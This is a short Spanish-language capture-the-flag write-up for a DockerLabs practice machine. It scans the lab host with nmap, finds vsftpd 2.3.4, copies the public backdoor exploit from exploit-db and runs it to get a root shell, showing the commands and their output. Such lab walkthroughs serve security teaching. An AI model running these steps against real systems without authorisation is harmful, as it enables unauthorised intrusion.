# dockerlabs

## FirstHacking

Desplegamos la maquina

Vamos a scanear puertos a ver que sale

```shell
nmap -p- -T4 --min-rate 5000 -sV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-19 15:58 -03
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
```

Tenemos un ftp de vsftpd 2.3.4, buscando esto en searchsploit

```shell
searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                             | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nos bajamos el exploit

```shell
cat /usr/share/exploitdb/exploits/unix/remote/49757.py -p >> exploit.py
```

Ejecutamos

```shell
python3 exploit.py 172.17.0.2   
/home/dyallo/Documents/Proyectos/dockerlabs/exploit.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
Success, shell opened
Send `exit` to quit shell
whoami
root
```